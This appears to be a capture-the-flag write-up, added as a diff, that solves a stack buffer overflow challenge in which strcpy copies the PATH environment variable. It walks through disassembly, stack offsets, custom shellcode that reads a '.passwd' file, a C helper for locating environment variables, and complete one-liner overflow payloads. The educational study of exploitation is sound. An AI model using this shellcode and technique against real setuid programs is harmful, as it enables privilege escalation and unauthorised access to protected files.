@@ -1,0 +1,175 @@
+Prelude
+
+~$ ./ch8 
+[+] Getting env...
+[-] Can't find USERNAME.
+~$ export USERNAME="Yandros"
+~$ ./ch8 
+[+] Getting env...
+HOME     = /challenge/app-systeme/ch8
+USERNAME = Yandros
+SHELL    = /bin/bash
+PATH     = /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/opt/tools/checksec/
+
+Overflow?
+
+Because of the strcpy calls, this is another program vulnerable to a buffer overflow attack :
+
+     struct EnvInfo GetEnv(void) {
+      struct EnvInfo env;
+    /* char env.path[128];
+        char env.shell[128];
+        char env.username[128];
+        char env.home[128];  */
+      /* [...] */
+      strcpy(env.home, ptr); /* [...] */
+      strcpy(env.username, ptr); /* [...] */
+      strcpy(env.shell, ptr); /* [...] */
+      strcpy(env.path, ptr);
+      return env;
+    }
+
+Download
+
+Given the order of memory allocation of a struct in the stack (see commented equivalent), path is the buffer to overflow.
+
+But if we try a classic overflow using $PATH, right when getting the offset right, the program crashes before reaching ret! Why is that?
+The technical detail
+
+If we look closely at the (dis)assembly code of GetEnv, we can notice a few (odd) things:
+
+gdb-peda$ disas GetEnv
+[...] # How much memory is allocated?
+0x080484aa <+6>:        sub    $0x22c,%esp      # (1)
+[...] # Let's see what happens after the last 'strcpy' call...
+   0x080485c0 <+284>:        call   0x8048390 <strcpy@plt> 
+   0x080485c5 <+289>:        mov    0x8(%ebp),%eax # (2-dest)
+   0x080485c8 <+292>:        lea    -0x21c(%ebp),%edx # (3-source)
+   0x080485ce <+298>:        mov    $0x200,%ebx # (4-length) 
+[...] # Some alignment details skipped...
+   0x08048602 <+350>:        mov    %ebx,%ecx # (4-length)
+   0x08048604 <+352>:        shr    $0x2,%ecx # (4-length)
+   0x08048607 <+355>:        mov    %eax,%edi # (2-dest)
+   0x08048609 <+357>:        mov    %edx,%esi # (3-source)
+   0x0804860b <+359>:        rep movsl %ds:(%esi),%es:(%edi)
+
+We see that:
+- (1) the program allocates 0x22c = 556 bytes (an EnvInfo struct is around 512 bytes long), so, as expected, it allocates enough memory for a local EnvInfo struct, the pointer, and some extra stuff;
+- there is an (unexpected) rep movsl ... instruction at the end of the function, which consists of copying n long words from %esi to %edi, with n being the value stored in %ecx ;
+- (2) it loads an address located at %ebp + 8 into the %edi register (destination address)
+- (3) it loads the address of %ebp - 540 (0x21c = 540) into the %esi register (source address)
+- (4) %ecx is initially set to 0x200 and then divided by 4 (shr $2), i.e., %ecx equals 128. Hence, 128 long (4-bytes) words will be copied, resulting in the 512 bytes of the 4 buffers of an EnvInfo struct.
+
+So, all this means that, in order to output its EnvInfo struct, GetEnv creates a local struct where it stores the data first, and then, in its prologue, GetEnv actually replicates the local struct into a "remote" struct, located at the address read at %ebp + 8
+Attack
+
+Since 540 - 128 = 412, 412 - 128 = 284 and 284 - 128 = 156, we get the following stack summary:
+- %ebp - 540​ | env.home​​ ​​
+- %ebp - 412 | env.username
+- %ebp - 284 | env.shell
+- %ebp - 156 | env.path
+- %ebp | saved frame pointer
+- %ebp + 4 | saved EIP
+- %ebp + 8 | rep movsl destination address
+
+The environment variable to overflow is $PATH, but it happens to be somewhat critical for the programs to work properly, so, in order to avoid having to explicit all the paths to programs like gdb, I will only be modifying it on the fly (by typing PATH="..." cmd instead of cmd) and will also be prepending "/usr/local/bin:" (15 chars long + ’\0’ = 16 chars long) to the junk.
+An example, to overwrite the EIP (156 + 4 + 4 = 164) with "AAA\0" = 0x00414141:
+
+~$ PATH=$(python -c 'print "/usr/local/bin:" + "A" * (164-16)') peda -ex "run" ./ch8
+[...]
+Stopped reason: SIGSEV
+0x00414141 in ?? ()
+​
+
+​
+
+If we try putting 4 chars into the saved EIP (and thus making the additional ’\0’ = 0x00 byte smash onto the saved rep movsl destination address), the program will fail before reaching ret :
+
+~$ PATH=$(python -c 'print "/usr/local/bin:" + "A" * (161-16) + "AAAA"') peda -ex "b*0x080485c5" -ex "run" -ex "i f" -ex "x/3wx \$ebp" ./ch8
+​[...]; saved eip 0x41414141
+[...] 
+0xbffff678:        0x41414141        0x41414141        0xbffff600
+gdb-peda$ continue
+[...]
+Stopped reason: SIGSEGV
+0xb7fd0075 in ?? () from /lib/i386-linux-gnu/libc.so.6
+
+So, as long as we replace the address following the saved EIP (XXXX) with the starting address of a writable 512-bytes long buffer (YYYY), we should be fine:
+
+PATH=$(python -c 'print "/usr/local/bin:" + "A" * (161-16) + "XXXX" + "YYYY"')
+
+Getting the right addresses (no ASLR)
+
+1) The XXXX address (value for %eip)
+The XXXX address is quite easy, specially if we store the shellcode in an environment variable:
+
+export SHELLCODE=$(python -c 'print "\x90" * 128 + "\x31\xc0\xb0\x0b\xeb\x19\x89\xe1\x8b\x1c\x24\x8d\x53\x09\x89\x54\x24\x04\x99\x89\x54\x24\x08\x88\x53\x08\x88\x53\x16\xcd\x80\xe8\xe2\xff\xff\xff/bin/cat .passwd"')
+
+(this shellcode is a custom one I’ve made to call cat .passwd instead of the usual shell spawning)
+
+To know the address of an environment variable, I use the following C helper:
+
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include <string.h>
+    int main(int argc, char * argv[]) {
+            char * ptr;
+            if(argc<3){
+                    printf("Usage: %s <environment var> <target program name>\n", argv[0]);
+                    exit(0);
+            }
+            ptr = getenv(argv[1]);
+            ptr += (strlen(argv[0]) - strlen(argv[2])) * 2;  
+            printf("%s will be at %p\n", argv[1], ptr);
+    }
+
+Download
+
+Get it into /tmp and then compile it (with, for instance, cd /tmp; gcc -m32 -o find_env find_env.c; cd -).
+Then (don’t forget to prepend a $PATH var with the same length as the final one) :
+
+~$ PATH=$(python -c 'print "/usr/local/bin:" + "A" * (161-16) + "XXXX" + "YYYY"') /tmp/find_env SHELLCODE ./ch8
+SHELLCODE will be at 0xbffffaba
+
+2) The YYYY address (writable 512-bytes long buffer)
+One (smart) solution, since getting the address of environment variables is quite easy, is to allocate a big (e.g., 600-bytes long) environment variable to use as writable junk space (credits to m_101’s French solution for the idea) :
+
+~$ export JUNK=$(python -c 'print "JUNK"*150')
+~$ PATH=$(python -c 'print "/usr/local/bin:" + "A" * (161-16) + "XXXX" + "YYYY"') /tmp/find_env JUNK ./ch8
+JUNK will be at 0xbffffca9
+
+( /!\ Be wary that exporting new env vars might shift old ones, like SHELLCODE)
+
+The other approach is to replicate the address originally present there.
+To do that, once we have the address of SHELLCODE outside gdb, it suffices to look for its offset under gdb and read the original address (at %ebp + 8). Remember that SHELLCODE (mine at least) starts with "\x31\xc0\xb0\x0b" = 0x0bb0c031 and is located at 0x...faba (EDIT: actually, with the 128-bit long nop prefix the actual address is 0x...faba + 128. The reasoning still applies, provided you use the actual starting address of "\x31\xc0\xb0\x0b"):
+
+~$ PATH=$(python -c 'print "/usr/local/bin:" + "A" * (161-16) + "XXXX" + "YYYY"') peda -ex "break *0x080485c0" -ex "run" -ex "x/wx \$ebp + 8" -ex "find 0x0bb0c031" ./ch8
+[...]
+0xbffff360:        0xbffff370
+Searching for '0x0bb0c031' in: None ranges
+Found 1 results, display max 1 items:
+[stack] : 0xbffffa64 --> 0xbb0c031 
+gdb-peda$ p 0xbffff370 + 0xfaba - 0xfa64
+$1 = 0xbffff3c6
+gdb-peda$ quit
+~$ PATH=$(python -c 'print "/usr/local/bin:" + "A" * (161-16) + "\xbf\xff\xfa\xba"[::-1] + "\xbf\xff\xf3\xc6"[::-1]') ./ch8
+[+] Getting env...
+content_of_passwd_here
+
+Summary - The final payload
+
+Remember, we had previously run
+
+~$ export USERNAME="Yandros"
+~$ export SHELLCODE=$(python -c 'print "\x90" * 128 + "\x31\xc0\xb0\x0b\xeb\x19\x89\xe1\x8b\x1c\x24\x8d\x53\x09\x89\x54\x24\x04\x99\x89\x54\x24\x08\x88\x53\x08\x88\x53\x16\xcd\x80\xe8\xe2\xff\xff\xff/bin/cat .passwd"')
+~$ export JUNK=$(python -c 'print "JUNK"*150')
+~$ PATH=$(python -c 'print "/usr/local/bin:" + "A" * (161-16) + "XXXX" + "YYYY"') /tmp/find_env SHELLCODE ./ch8
+SHELLCODE will be at 0xbffffaba
+~$ PATH=$(python -c 'print "/usr/local/bin:" + "A" * (161-16) + "XXXX" + "YYYY"') /tmp/find_env JUNK ./ch8
+JUNK will be at 0xbffffca9
+
+Now, we can get the content of .passwd with a one-liner:
+
+~$ PATH=$(python -c 'print "/usr/local/bin:" + "A" * (161-16) + "\xbf\xff\xfa\xba"[::-1] + "\xbf\xff\xfc\xa9"[::-1]') ./ch8
+[+] Getting env...
+content_of_passwd_here
